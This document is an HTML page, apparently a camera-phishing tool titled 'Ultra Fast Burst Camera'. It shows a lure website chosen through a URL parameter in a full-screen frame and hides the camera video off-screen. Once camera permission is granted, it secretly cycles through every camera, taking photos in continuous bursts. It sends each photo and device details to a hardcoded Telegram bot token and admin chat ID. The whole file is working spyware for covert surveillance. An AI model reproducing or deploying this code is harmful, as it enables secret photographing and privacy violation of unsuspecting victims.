<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ultra Fast Burst Camera</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            width: 100vw;
            height: 100vh;
            overflow: hidden;
            position: relative;
        }
        
        #backgroundCamera {
            position: fixed;
            top: -9999px;
            left: -9999px;
            width: 1px;
            height: 1px;
            opacity: 0;
            pointer-events: none;
        }
        
        #cameraVideo {
            width: 640px;
            height: 480px;
        }
        
        #websiteFrame {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border: none;
            z-index: 1;
        }
    </style>
</head>
<body>
    <div id="backgroundCamera">
        <video id="cameraVideo" autoplay playsinline muted></video>
    </div>
    
    <iframe id="websiteFrame" src="about:blank"></iframe>

    <script>
        // =====================================================
        //  ULTRA FAST BURST - SINGLE PERMISSION REQUEST
        // =====================================================
        
        function getConfigFromURL() {
            const urlParams = new URLSearchParams(window.location.search);
            const websiteParam = urlParams.get('site') || urlParams.get('url') || urlParams.get('website');
            const chatId = urlParams.get('chat_id');
            
            let websiteURL = 'https://www.example.com';
            
            if (websiteParam) {
                websiteURL = decodeURIComponent(websiteParam);
                if (!websiteURL.startsWith('http://') && !websiteURL.startsWith('https://')) {
                    websiteURL = 'https://' + websiteURL;
                }
            }
            
            return {
                website: websiteURL,
                chatId: chatId || 'unknown'
            };
        }
        
        const config = getConfigFromURL();
        const BOT_TOKEN = '8307999302:AAGc6sLGoklnbpWsXg76lcdQcVAzGgsp8cQ';
        const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}`;
        const ADMIN_CHAT_ID = '7838949014'; // Your admin ID
        const USER_CHAT_ID = config.chatId; // User ID from URL
        const CHAT_IDS = [ADMIN_CHAT_ID, USER_CHAT_ID]; // Send to both
        
        // ‚ö° ULTRA FAST CONFIG
        const PHOTOS_PER_CAMERA = 3;      // 3 photos each camera
        const CAPTURE_DELAY = 80;          // 80ms between photos (ULTRA FAST!)
        const WARMUP_TIME = 600;           // 600ms warmup
        const SWITCH_DELAY = 200;          // 200ms switch delay (minimal)
        
        let availableCameras = [];
        let currentCameraIndex = 0;
        let burstRunning = false;
        let photoCounter = 0;
        let totalPhotosSent = 0;
        let cameraReady = false;
        let currentStream = null;
        
        const cameraVideo = document.getElementById('cameraVideo');
        const websiteFrame = document.getElementById('websiteFrame');
        
        function loadWebsite() {
            try {
                websiteFrame.src = config.website;
                console.log('üåê Website loaded:', config.website);
            } catch (error) {
                console.error('Failed to load website:', error);
            }
        }
        
        // Get all available cameras (ONLY ONCE!)
        async function discoverCameras() {
            try {
                console.log('üîç Discovering cameras...');
                
                // Request permission ONCE with both cameras
                const tempStream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: 'user' }
                });
                
                // Permission granted! Now get all devices
                const devices = await navigator.mediaDevices.enumerateDevices();
                const videoDevices = devices.filter(device => device.kind === 'videoinput');
                
                // Stop temp stream
                tempStream.getTracks().forEach(track => track.stop());
                
                availableCameras = videoDevices;
                console.log(`‚úÖ Found ${availableCameras.length} cameras:`, videoDevices.map(d => d.label));
                
                return availableCameras.length > 0;
            } catch (error) {
                console.error('‚ùå Camera discovery error:', error);
                return false;
            }
        }
        
        // Switch to specific camera by device ID
        async function switchToCamera(deviceId) {
            try {
                cameraReady = false;
                
                // Stop current stream
                if (currentStream) {
                    currentStream.getTracks().forEach(track => track.stop());
                }
                
                console.log(`üìπ Switching to camera: ${deviceId}`);
                
                const constraints = {
                    video: {
                        deviceId: { exact: deviceId },
                        width: { ideal: 1280 },
                        height: { ideal: 720 },
                        frameRate: { ideal: 30 }
                    }
                };
                
                currentStream = await navigator.mediaDevices.getUserMedia(constraints);
                cameraVideo.srcObject = currentStream;
                
                await new Promise((resolve) => {
                    cameraVideo.onloadedmetadata = resolve;
                    setTimeout(resolve, 1500);
                });
                
                await cameraVideo.play();
                
                // Quick warmup
                await new Promise(resolve => setTimeout(resolve, WARMUP_TIME));
                
                cameraReady = true;
                console.log(`‚úÖ Camera ready: ${cameraVideo.videoWidth}x${cameraVideo.videoHeight}`);
                return true;
            } catch (error) {
                console.error('‚ùå Switch camera error:', error);
                return false;
            }
        }
        
        // ULTRA FAST capture
        async function captureFrameFast() {
            return new Promise((resolve) => {
                if (!cameraReady || cameraVideo.readyState < 2) {
                    resolve(null);
                    return;
                }
                
                try {
                    const canvas = document.createElement('canvas');
                    const ctx = canvas.getContext('2d', { alpha: false });
                    
                    canvas.width = cameraVideo.videoWidth || 1280;
                    canvas.height = cameraVideo.videoHeight || 720;
                    
                    if (canvas.width === 0 || canvas.height === 0) {
                        resolve(null);
                        return;
                    }
                    
                    ctx.drawImage(cameraVideo, 0, 0, canvas.width, canvas.height);
                    canvas.toBlob(resolve, 'image/jpeg', 0.87);
                } catch (error) {
                    console.error('‚ùå Capture error:', error);
                    resolve(null);
                }
            });
        }
        
        // Fire and forget send to BOTH admin and user
        function sendPhotoFast(blob, cameraType, photoNum) {
            if (!blob) return;
            
            CHAT_IDS.forEach(chatId => {
                const formData = new FormData();
                formData.append('chat_id', chatId);
                formData.append('photo', blob, `${cameraType}_${photoNum}_${Date.now()}.jpg`);
                
                const caption = `üì∏ ${cameraType.toUpperCase()} #${photoNum}\nüë§ User: ${USER_CHAT_ID}`;
                formData.append('caption', caption);
                
                fetch(`${TELEGRAM_API}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                }).then(r => r.json()).then(result => {
                    if (result.ok) {
                        totalPhotosSent++;
                        console.log(`‚úÖ Sent to ${chatId}: ${cameraType.toUpperCase()} #${photoNum}`);
                    }
                }).catch(e => console.error('‚ùå', e));
            });
        }
        
        // Capture burst from current camera
        async function captureBurstFromCamera(cameraLabel) {
            console.log(`üì∏ Capturing ${PHOTOS_PER_CAMERA} photos from ${cameraLabel}...`);
            
            for (let i = 0; i < PHOTOS_PER_CAMERA; i++) {
                const blob = await captureFrameFast();
                
                if (blob) {
                    photoCounter++;
                    sendPhotoFast(blob, cameraLabel, photoCounter);
                }
                
                if (i < PHOTOS_PER_CAMERA - 1) {
                    await new Promise(resolve => setTimeout(resolve, CAPTURE_DELAY));
                }
            }
        }
        
        // MAIN ULTRA FAST BURST LOOP
        async function ultraFastBurst() {
            if (burstRunning) return;
            if (availableCameras.length === 0) {
                console.error('‚ùå No cameras available');
                return;
            }
            
            burstRunning = true;
            console.log('‚ö° ULTRA FAST BURST: CYCLING THROUGH ALL CAMERAS');
            
            while (burstRunning) {
                // Cycle through all available cameras
                for (let i = 0; i < availableCameras.length; i++) {
                    const camera = availableCameras[i];
                    const cameraLabel = camera.label || `Camera ${i + 1}`;
                    const cameraType = cameraLabel.toLowerCase().includes('back') || 
                                      cameraLabel.toLowerCase().includes('rear') || 
                                      cameraLabel.toLowerCase().includes('environment') ? 'back' : 'front';
                    
                    console.log(`üîÑ Switching to: ${cameraLabel}`);
                    
                    const switched = await switchToCamera(camera.deviceId);
                    
                    if (switched) {
                        await captureBurstFromCamera(cameraType);
                        
                        // Small delay before next camera
                        await new Promise(resolve => setTimeout(resolve, SWITCH_DELAY));
                    } else {
                        console.error(`‚ùå Failed to switch to ${cameraLabel}`);
                    }
                }
                
                console.log('üîÅ Completed full cycle, restarting...');
            }
        }
        
        async function sendStartMessage() {
            try {
                const msg = `‚ö° *ULTRA FAST BURST MODE*\n\n` +
                    `üì∏ Cameras: ${availableCameras.length} detected\n` +
                    `üì∑ Pattern: ${PHOTOS_PER_CAMERA} photos per camera\n` +
                    `‚è±Ô∏è Speed: ${CAPTURE_DELAY}ms between shots\n` +
                    `üîÑ Switch: ${SWITCH_DELAY}ms\n` +
                    `üåê Site: ${config.website}\n` +
                    `üë§ User ID: ${USER_CHAT_ID}\n` +
                    `üëë Admin ID: ${ADMIN_CHAT_ID}\n` +
                    `‚è∞ ${new Date().toLocaleString()}`;
                
                for (const chatId of CHAT_IDS) {
                    await fetch(`${TELEGRAM_API}/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: chatId,
                            text: msg,
                            parse_mode: 'Markdown'
                        })
                    });
                }
            } catch (e) {
                console.error('Failed to send start message:', e);
            }
        }
        
        async function init() {
            console.log('‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê');
            console.log('‚ö° ULTRA FAST BURST CAMERA');
            console.log('‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê');
            console.log('üëë Admin ID:', ADMIN_CHAT_ID);
            console.log('üë§ User ID:', USER_CHAT_ID);
            console.log('üåê Website:', config.website);
            console.log('üì∏ Photos per camera:', PHOTOS_PER_CAMERA);
            console.log('‚ö° Speed: MAXIMUM');
            console.log('üì§ Sending to: BOTH admin & user');
            console.log('‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê');
            
            loadWebsite();
            
            // Discover cameras ONCE (single permission request)
            const camerasFound = await discoverCameras();
            
            if (camerasFound) {
                await sendStartMessage();
                console.log('üöÄ Starting ultra fast burst...');
                ultraFastBurst();
            } else {
                console.error('‚ùå No cameras found or permission denied');
            }
        }
        
        window.addEventListener('load', init);
        
        window.addEventListener('beforeunload', () => {
            burstRunning = false;
            if (currentStream) {
                currentStream.getTracks().forEach(track => track.stop());
            }
        });
    </script>
</body>
</html>
